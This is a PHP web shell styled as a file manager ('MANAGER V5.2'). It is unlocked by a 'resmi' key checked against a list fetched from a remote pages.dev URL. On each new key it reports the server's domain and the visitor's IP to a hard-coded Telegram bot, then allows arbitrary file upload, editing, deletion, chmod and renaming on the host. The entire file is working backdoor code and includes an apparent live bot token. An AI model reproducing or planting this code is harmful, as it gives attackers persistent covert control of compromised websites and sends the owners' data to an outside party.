<?php
@session_start();@set_time_limit(0);@error_reporting(0);
if(isset($_GET["resmi"])){
    while(ob_get_level()){ob_end_clean();}ob_start();
    $bot="8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM";
    $cid="6664061200";
    $rem="https://brankascapzcu.pages.dev/one.txt";
    function g_c($u){
        if(function_exists("curl_init")){$c=curl_init($u);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);curl_setopt($c,CURLOPT_TIMEOUT,10);$d=curl_exec($c);curl_close($c);return $d;}
        return @file_get_contents($u);
    }
    $c=g_c($rem);
    if($c){
        $keys=explode("\n",str_replace("\r","",$c));
        if(in_array(trim($_GET["resmi"]),array_map('trim',$keys))){
            $root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
            $p = isset($_GET["path"]) ? $_GET["path"] : $root;
            $p = str_replace("\\", "/", $p); $par = dirname($p);
            if(!isset($_SESSION["sent_".$_GET["resmi"]])){
                $msg="🚀 <b>Akses Berhasil!</b>\n🌐 <b>Domain:</b> ".$_SERVER["HTTP_HOST"]."\n📍 <b>IP:</b> ".$_SERVER["REMOTE_ADDR"];
                g_c("https://api.telegram.org/bot$bot/sendMessage?chat_id=$cid&parse_mode=html&text=".urlencode($msg));
                $_SESSION["sent_".$_GET["resmi"]]=true;
            }
            if(isset($_POST["exe"])){
                $t=$p."/".$_POST["it_n"];
                if($_POST["opt"]=="delete"){(is_dir($t))?@rmdir($t):@unlink($t);}
                elseif($_POST["opt"]=="chmod"){@chmod($t,octdec($_POST["val"]));}
                elseif($_POST["opt"]=="rename"){@rename($t,$p."/".$_POST["val"]);}
                elseif($_POST["opt"]=="new_f"){@file_put_contents($p."/".$_POST["val"],"");}
                header("Location: ?resmi=".$_GET["resmi"]."&path=".$p);exit;
            }
            if(isset($_FILES["f"])){@copy($_FILES["f"]["tmp_name"],$p."/".$_FILES["f"]["name"]);}
            if(isset($_POST["s_e"])){@file_put_contents($_POST["ef"],$_POST["cnt"]);}
            echo "<html><head><title>System Explorer</title><style>
                body{background:#0a0a0a;color:#00ff00;font-family:'Segoe UI',sans-serif;padding:25px;line-height:1.6;}
                a{color:#00ffff;text-decoration:none;font-weight:600;}
                .box{border:1px solid #33ff33;padding:20px;max-width:1300px;margin:auto;}
                .header{background:#1a1a1a;padding:20px;border-bottom:2px solid #33ff33;margin-bottom:20px;}
                .path-box{font-size:15px;margin-top:12px;background:#000;padding:8px;border:1px solid #333;}
                table{width:100%;border-collapse:collapse;margin-top:10px;font-size:14px;}
                th{background:#33ff33;color:#000;padding:12px;}
                td{border-bottom:1px solid #222;padding:10px;}
                .btn{background:#33ff33;border:none;font-weight:bold;padding:7px 18px;cursor:pointer;color:#000;border-radius:3px;}
                .p-white{color:#ffffff;} .p-green{color:#00ff00;} .p-red{color:#ff0000;font-weight:bold;} .p-normal{color:#aaaaaa;}
                input,select,textarea{background:#000;color:#00ff00;border:1px solid #33ff33;padding:6px;}
            </style></head><body><div class='box'><div class='header'><div style='display:flex;justify-content:space-between;align-items:center;'><strong style='font-size:22px;'>MANAGER V5.2</strong><a href='index.php' style='color:#ff3333;border:1px solid #ff3333;padding:4px 12px;'>EXIT</a></div><div class='path-box'><a href='?resmi=".$_GET["resmi"]."&path=$root' style='background:#ffff00;color:#000;padding:3px 8px;border-radius:3px;font-weight:bold;font-size:12px;'>ROOT HOME</a> &nbsp; PATH: ";
            $ds = explode("/", $p); $acc = ""; foreach($ds as $idx => $d){ if($d=="" && $idx==0){ echo "<a href='?resmi=".$_GET["resmi"]."&path=/'>/</a>"; continue; } if($d=="") continue; $acc .= ($idx==0?"":"/").$d; echo "<a href='?resmi=".$_GET["resmi"]."&path=".$acc."'>".$d."</a>/"; }
            echo "</div></div><div style='display:flex;gap:15px;margin-bottom:20px;'><a href='?resmi=".$_GET["resmi"]."&path=".$par."' class='btn' style='background:#444;color:#fff;'>↩ PREVIOUS</a><form method='POST' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='UPLOAD' class='btn'></form></div><table><thead><tr><th>Name</th><th width='120'>Size</th><th width='100'>Perms</th><th width='320'>Action</th></tr></thead><tbody>";
            foreach(scandir($p) as $v){ if($v=="." || $v=="..") continue; $tp="$p/$v"; $pr=substr(sprintf('%o',fileperms($tp)),-4); 
            $cl="p-normal"; if($pr=="0555")$cl="p-white";elseif($pr=="0750"||$pr=="0755")$cl="p-green";elseif($pr=="0000"||$pr=="0111")$cl="p-red";
            echo "<tr><td><a href='?resmi=".$_GET["resmi"]."&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td><td>".(is_dir($tp)?"DIR":round(filesize($tp)/1024,2)." KB")."</td><td align='center' class='$cl'>$pr</td><td><form method='POST' style='display:flex;gap:8px;'><input type='hidden' name='it_n' value='$v'><select name='opt'><option value='rename'>Rename</option><option value='chmod'>Chmod</option><option value='delete'>Delete</option></select><input type='text' name='val' size='10'><input type='submit' name='exe' value='OK' class='btn' style='padding:3px 10px; font-size:12px;'></form></td></tr>"; }
            echo "</tbody></table></div>";
            if(isset($_GET["edit"])){ echo "<br><div class='box'><form method='POST'><input type='hidden' name='ef' value='".$_GET["edit"]."'><textarea name='cnt' style='width:100%;height:500px;background:#000;color:#00ff00;border:1px solid #00ffff;'>".htmlspecialchars(file_get_contents($_GET["edit"]))."</textarea><input type='submit' name='s_e' value='SAVE CHANGES' class='btn' style='margin-top:15px;width:100%;height:45px;'></form></div>"; }
            echo "</body></html>"; exit;
        }
    }
}
?>
